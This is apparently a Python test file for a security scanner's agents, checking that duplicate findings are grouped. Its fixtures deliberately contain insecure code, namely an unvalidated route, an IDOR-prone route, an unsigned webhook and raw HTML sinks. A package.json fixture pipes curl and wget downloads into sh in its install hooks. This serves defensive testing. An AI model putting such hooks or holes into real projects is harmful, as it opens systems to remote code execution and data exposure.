from __future__ import annotations

import unittest
import tempfile
from pathlib import Path

from support import ensure_api_path

ensure_api_path()

from app.agents import (  # noqa: E402
    AuthzAgent,
    BuildbreakAgent,
    DependencyAgent,
    FrontendRuntimeAgent,
    InputValidationAgent,
    RepoMap,
    RepoMapFile,
    RepoMapKeyFiles,
    RepoMapScan,
    WebhookAgent,
)
from app.agents.types import AgentContext  # noqa: E402


class FindingNoiseReductionTests(unittest.TestCase):
    def test_input_validation_prefers_one_validation_gap_finding_per_file(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            (target / "users.py").write_text(
                "\n".join(
                    [
                        "from fastapi import APIRouter, Request",
                        "router = APIRouter()",
                        '@router.post("/users/{user_id}")',
                        "async def update_user(user_id: str, body: dict, request: Request):",
                        "    payload = await request.json()",
                        "    return payload",
                    ]
                ),
                encoding="utf-8",
            )

            report = InputValidationAgent().analyze_context(
                self._context(root, routes=["apps/api/app/api/routes/users.py"])
            )
            validation_gap_kinds = {
                item.kind
                for item in report.findings
                if item.kind in {"raw_request_parsing_without_validation", "weak_body_type", "missing_schema_validation_review"}
            }
            self.assertEqual(validation_gap_kinds, {"raw_request_parsing_without_validation"})

    def test_authz_prefers_idor_finding_over_generic_missing_authz(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            (target / "billing.py").write_text(
                "\n".join(
                    [
                        "from fastapi import APIRouter",
                        "router = APIRouter()",
                        '@router.get("/billing/users/{user_id}")',
                        "async def get_billing_user(user_id: str):",
                        "    return session.get(User, user_id)",
                    ]
                ),
                encoding="utf-8",
            )

            report = AuthzAgent().analyze_context(
                self._context(root, routes=["apps/api/app/api/routes/billing.py"])
            )
            kinds = {item.kind for item in report.findings}
            self.assertIn("idor_candidate", kinds)
            self.assertNotIn("suspicious_missing_authorization", kinds)

    def test_webhook_suppresses_idempotency_review_when_signature_is_missing(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            (target / "stripe_webhooks.py").write_text(
                "\n".join(
                    [
                        "from fastapi import APIRouter, Request",
                        "router = APIRouter()",
                        '@router.post("/webhooks/stripe")',
                        "async def stripe_webhook(request: Request):",
                        "    payload = await request.body()",
                        "    return {'ok': True}",
                    ]
                ),
                encoding="utf-8",
            )

            report = WebhookAgent().analyze_context(
                self._context(root, webhooks=["apps/api/app/api/routes/stripe_webhooks.py"])
            )
            kinds = {item.kind for item in report.findings}
            self.assertIn("missing_signature_verification", kinds)
            self.assertNotIn("missing_idempotency_review", kinds)

    def test_frontend_groups_multiple_html_sinks_into_one_finding(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web" / "components"
            target.mkdir(parents=True, exist_ok=True)
            (target / "Danger.tsx").write_text(
                "\n".join(
                    [
                        '"use client";',
                        "export function Danger({ html }: { html: string }) {",
                        "  document.body.insertAdjacentHTML('beforeend', html);",
                        "  return <div dangerouslySetInnerHTML={{ __html: html }} />;",
                        "}",
                    ]
                ),
                encoding="utf-8",
            )

            report = FrontendRuntimeAgent().analyze_context(
                self._context(root, frontend=["apps/web/components/Danger.tsx"])
            )
            html_findings = [item for item in report.findings if item.kind == "unsafe_html_sink"]
            self.assertEqual(len(html_findings), 1)
            self.assertIn("2 lines", html_findings[0].description)

    def test_dependency_groups_repetitive_manifest_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web"
            target.mkdir(parents=True, exist_ok=True)
            (target / "package.json").write_text(
                "\n".join(
                    [
                        "{",
                        '  "name": "demo",',
                        '  "scripts": {',
                        '    "preinstall": "curl https://example.com/pre.sh | sh",',
                        '    "postinstall": "wget https://example.com/post.sh -O- | sh"',
                        "  },",
                        '  "dependencies": {',
                        '    "request": "^2.88.0",',
                        '    "vm2": "^3.9.0",',
                        '    "left-pad": "latest"',
                        "  }",
                        "}",
                    ]
                ),
                encoding="utf-8",
            )

            report = DependencyAgent().analyze_context(
                self._context(root, manifests=["apps/web/package.json"])
            )
            self.assertEqual(sum(1 for item in report.findings if item.kind == "remote_install_script"), 1)
            self.assertEqual(sum(1 for item in report.findings if item.kind == "high_risk_dependency"), 1)
            self.assertEqual(sum(1 for item in report.findings if item.kind == "floating_version"), 1)

    def test_buildbreak_does_not_repeat_missing_lockfile_as_package_manager_metadata(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web"
            target.mkdir(parents=True, exist_ok=True)
            (target / "package.json").write_text('{"name":"demo"}', encoding="utf-8")

            report = BuildbreakAgent().analyze_context(
                self._context(root, manifests=["apps/web/package.json"])
            )
            kinds = {item.kind for item in report.findings}
            self.assertNotIn("missing_package_manager_metadata", kinds)

    def _context(self, root: Path, **key_files: list[str]) -> AgentContext:
        payload = {
            field: [RepoMapFile(path=path, reason=f"{field} test slice") for path in paths]
            for field, paths in key_files.items()
        }
        repo_map = RepoMap(
            repo_name=root.name,
            root_path=str(root),
            summary="test repo",
            primary_stack="test",
            languages=["python", "typescript"],
            stacks=[],
            key_files=RepoMapKeyFiles(**payload),
            scan=RepoMapScan(scanned_directories=4, scanned_files=8, truncated=False),
        )
        return AgentContext(
            repo_path=str(root),
            metadata={"repo_map": repo_map.model_dump(mode="json")},
        )


if __name__ == "__main__":
    unittest.main()
